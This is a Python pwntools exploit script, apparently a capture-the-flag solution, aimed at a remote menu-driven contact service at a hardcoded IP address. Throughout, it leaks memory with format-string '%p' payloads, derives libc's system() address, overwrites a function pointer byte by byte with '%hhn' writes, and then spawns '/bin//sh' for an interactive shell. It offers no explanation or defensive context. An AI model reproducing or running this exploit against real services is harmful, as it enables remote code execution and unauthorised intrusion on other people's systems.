from pwn import *

p = remote("54.165.223.128",2555)
#p = remote("127.0.0.1",2555)

raw_input("Wait")
print p.recvuntil(">>> ")
p.sendline("1")
p.sendline("c1")
p.sendline("1234567890")
p.sendline("200")
p.sendline("%p"*90)
print p.recvuntil(">>> ")
p.sendline("1")
p.sendline("c2")
p.sendline("1234567890")
p.sendline("200")
p.sendline("%p"*90)
print p.recvuntil(">>> ")
p.sendline("1")
p.sendline("c3")
p.sendline("1234567890")
p.sendline("200")
p.sendline("%p"*90)
print p.recvuntil(">>> ")
p.sendline("3")
p.sendline("c1")
p.sendline("2")
p.sendline("200")
p.sendline("%9$s"+"%p"*90)
print p.recvuntil(">>> ")
p.sendline("3")
p.sendline("c1")
p.sendline("1")
p.sendline("X"*4 + "\x00"*60 + p32(0x804b03c)  + "A"*4 + p32(0x0804b03c) + p32(0x0804b020) + "AAAA")
p.sendline("4")
print p.recvuntil("Phone #: ")
print p.recvuntil("Phone #: ")
malloc_addr = p.recvuntil("Description: ")[3::-1].encode('hex')
memset_addr = u32(p.recvuntil("\n")[:4])


system_addr = memset_addr - 0x3BFA0 - 0xADE84 +4

print malloc_addr , hex((memset_addr))
p.sendline("3")
p.sendline("XXXX")
p.sendline("2")
p.sendline("200")
p.sendline("%"+ str(system_addr%256) +"c%9$hhn")
#p.sendline("%"+ str(65) +"$%9$hhn")
print p.recvuntil(">>> ")
p.sendline("4")
print p.recvuntil("Phone #: ")
print p.recvuntil("Phone #: ")
malloc_addr = p.recvuntil("Description: ")[3::-1].encode('hex')
memset_addr = u32(p.recvuntil("\n")[:4])
print malloc_addr , hex((memset_addr))


p.sendline("3")
p.sendline("XXXX")
p.sendline("2")
p.sendline("200")
p.sendline("%"+ str((system_addr>>8)%256) +"c%9$hhn")
#p.sendline("%p"*90)
print p.recvuntil(">>> ")

p.sendline("3")
p.sendline("XXXX")
p.sendline("1")
p.sendline("X"*4 + "\x00"*60 + p32(0x804b03d)  + "A"*4 + p32(0x0804b03d) + p32(0x0804b020) + "AAAA")

print p.recvuntil(">>> ")
p.sendline("4")
print p.recvuntil("Phone #: ")
print p.recvuntil("Phone #: ")
malloc_addr = p.recvuntil("Description: ")[3::-1].encode('hex')
memset_addr = u32(p.recvuntil("\n")[:4])
print malloc_addr , hex((memset_addr))

p.sendline("3")
p.sendline("XXXX")
p.sendline("2")
p.sendline("200")
p.sendline("%"+ str((system_addr>>16)%256) +"c%9$hhn")
#p.sendline("%p"*90)
print p.recvuntil(">>> ")

p.sendline("3")
p.sendline("XXXX")
p.sendline("1")
p.sendline("X"*4 + "\x00"*60 + p32(0x804b03e)  + "A"*4 + p32(0x0804b03e) + p32(0x0804b020) + "AAAA")

print p.recvuntil(">>> ")
p.sendline("4")
print p.recvuntil("Phone #: ")
print p.recvuntil("Phone #: ")
malloc_addr = p.recvuntil("Description: ")[3::-1].encode('hex')
memset_addr = u32(p.recvuntil("\n")[:4])
print malloc_addr , hex((memset_addr))

p.sendline("3")
p.sendline("XXXX")
p.sendline("2")
p.sendline("200")
p.sendline("%"+ str((system_addr>>24)%256) +"c%9$hhn")
#p.sendline("%p"*90)
print p.recvuntil(">>> ")

p.sendline("3")
p.sendline("XXXX")
p.sendline("1")
p.sendline("X"*4 + "\x00"*60 + p32(0x804b03f)  + "A"*4 + p32(0x0804b03f) + p32(0x0804b020) + "AAAA")

print p.recvuntil(">>> ")
p.sendline("4")
print p.recvuntil("Phone #: ")
print p.recvuntil("Phone #: ")
malloc_addr = p.recvuntil("Description: ")[3::-1].encode('hex')
memset_addr = u32(p.recvuntil("\n")[:4])
print malloc_addr , hex((memset_addr))


p.sendline("3")
p.sendline("XXXX")
p.sendline("2")
p.sendline("200")
#p.sendline("%"+ str((system_addr)%256) +"c%9$n")
p.sendline("%p"*90)
print p.recvuntil(">>> ")

p.sendline("3")
p.sendline("XXXX")
p.sendline("1")
p.sendline(p32(0x0804b0ae) + "||/bin//sh" + "\x00"*50 + p32(0x804b03c)  + "A"*4 + p32(0x0804b03c) + p32(0x0804b020) + "AAAA")
print p.recvuntil(">>> ")
p.sendline("4")
print p.recvuntil("Phone #: ")
print p.recvuntil("Phone #: ")
malloc_addr = p.recvuntil("Description: ")[3::-1].encode('hex')
memset_addr = u32(p.recvuntil("\n")[:4])
print hex(system_addr) , hex((memset_addr))


p.sendline("2")
p.sendline(p32(0x0804b0ae) + "||/bin//sh" )


p.interactive()



